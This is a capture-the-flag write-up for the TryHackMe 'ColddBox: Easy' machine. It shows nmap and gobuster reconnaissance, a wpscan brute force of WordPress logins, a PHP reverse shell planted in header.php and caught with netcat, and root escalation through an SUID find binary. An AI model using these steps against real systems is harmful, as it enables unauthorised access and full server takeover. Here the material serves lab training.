---
title: "TryHackMe - ColddBox: Easy"
categories:
  - TryHackMe
tags:
  - escalation
  - privesc
  - exploit
  - writeup
  - tryhackme
  - hacking
---
An easy level machine with multiple ways to escalate privileges.

## Scanning
- Check if the machine is up.
```bash
    $ ping 10.10.203.8                                                                     
    PING 10.10.203.8 (10.10.203.8) 56(84) bytes of data.
    64 bytes from 10.10.203.8: icmp_seq=1 ttl=63 time=200 ms
    64 bytes from 10.10.203.8: icmp_seq=2 ttl=63 time=199 ms
    ```

- Nmap time! With aggressive mode because why not.
    ```bash
    $ sudo nmap -A -oN resultNmap 10.10.203.8                                                   130 ⨯
    [sudo] password for kali: 
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 07:25 EST
    Nmap scan report for 10.10.203.8
    Host is up (0.20s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-generator: WordPress 4.1.31
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: ColddBox | One more machine
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.91%E=4%D=1/9%OT=80%CT=1%CU=44313%PV=Y%DS=2%DC=T%G=Y%TM=5FF9A0E5
    OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS(
    OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
    OS:NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
    OS:R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
    OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
    OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
    OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
    OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
    OS:S)

    Network Distance: 2 hops

    TRACEROUTE (using port 23/tcp)
    HOP RTT       ADDRESS
    1   199.31 ms 10.11.0.1
    2   199.37 ms 10.10.203.8

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 57.74 seconds
    ```

    Port 80 open with WordPress inside.

## Recon
- Open the website at port 80.
    <center><a href="/assets/images/tryhackme/colddbox-easy/1.png"><img src="/assets/images/tryhackme/colddbox-easy/1.png"></a></center>

- WordPress! Let's search for some directory first.
- Run `gobuster` to find directories, maybe interesting to us.
    ```bash
    $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.203.8 -t5
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.203.8
    [+] Threads:        5
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2021/01/09 07:49:55 Starting gobuster
    ===============================================================
    /wp-content (Status: 301)
    /wp-includes (Status: 301)
    /wp-admin (Status: 301)
    /hidden (Status: 301)
    ```

- There is `/hidden/` directory. Let's see what is it.
    <center><a href="/assets/images/tryhackme/colddbox-easy/2.png"><img src="/assets/images/tryhackme/colddbox-easy/2.png"></a></center>

## Initial Foothold

- There is 3 users there at the `/hidden/` page, which is `c0ldd`, `hugo`, and `philip. We could bruteforce the `wp-login` page since it's WordPress.
- Bruteforce the users password using `wp2scan`.
    ```bash
    $  wpscan --url 10.10.203.8 --usernames hugo,c0ldd,philip --passwords /usr/share/wordlists/rockyou.txt  

    _______________________________________________________________
            __          _______   _____
            \ \        / /  __ \ / ____|
            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                \/  \/   |_|    |_____/ \___|\__,_|_| |_|

            WordPress Security Scanner by the WPScan Team
                            Version 3.8.10
        Sponsored by Automattic - https://automattic.com/
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________

    [+] URL: http://10.10.203.8/ [10.10.203.8]
    [+] Started: Sat Jan  9 08:42:19 2021

    Interesting Finding(s):
    ...
    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
    Checking Config Backups - Time: 00:00:01 <=======================> (22 / 22) 100.00% Time: 00:00:01

    [i] No Config Backups Found.

    [+] Performing password attack on Wp Login against 3 user/s
    [SUCCESS] - c0ldd / 9876543210 
    ...

    ```

- We got c0ldd's password, let's login.
    <center><a href="/assets/images/tryhackme/colddbox-easy/3.png"><img src="/assets/images/tryhackme/colddbox-easy/3.png"></a></center>

- We got the Admin's Dashboard. Let's upload our [reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) by changing the source code of `header.php` file and update the file once we done it.
    <center><a href="/assets/images/tryhackme/colddbox-easy/4.png"><img src="/assets/images/tryhackme/colddbox-easy/4.png"></a></center>

    **Don't Forget** to change the `$ip` and `$port` of the reverse shell to your `tun0` IP Address and your netcat listen port.
    {: .notice--info}

- Run `netcat` to listen the port we declared on the reverse shell.
    ```bash
    $ nc -lnvp 4444                   
    listening on [any] 4444 ...
    ```

- Open the machine's IP at port 80 again and we got our reverse shell working!
    ```bash
    $ nc -lnvp 4444                   
    listening on [any] 4444 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.203.8] 58816
    Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
    15:31:59 up  2:19,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    ```

## Escalation
- Search for existing SUID.
    ```bash
    $ find / -uid 0 -perm -4000 -type f 2>/dev/null
    /bin/fusermount
    /bin/umount
    /bin/mount
    /usr/bin/chsh
    /usr/bin/gpasswd
    /usr/bin/pkexec
    /usr/bin/find
    /usr/bin/sudo
    /usr/bin/newgidmap
    /usr/bin/newgrp
    /usr/bin/newuidmap
    /usr/bin/chfn
    /usr/bin/passwd
    /usr/lib/openssh/ssh-keysign
    /usr/lib/snapd/snap-confine
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    ```

- We can use payload from [gtfobins](https://gtfobins.github.io/gtfobins/find/#suid) to escalate our privilege using SUID at `/usr/bin/find`.
    ```bash
    $ find . -exec /bin/sh -p \; -quit
    $ whoami
    root
    ```

- user.txt:
    ```bash
    $ cd /home/c0ldd
    $ ls
    user.txt
    $ cat user.txt
    --REDACTED--
    ```
- root.txt:
    ```bash
    $ cd /root
    $ ls
    root.txt
    $ cat root.txt
    --REDACTED--
    ```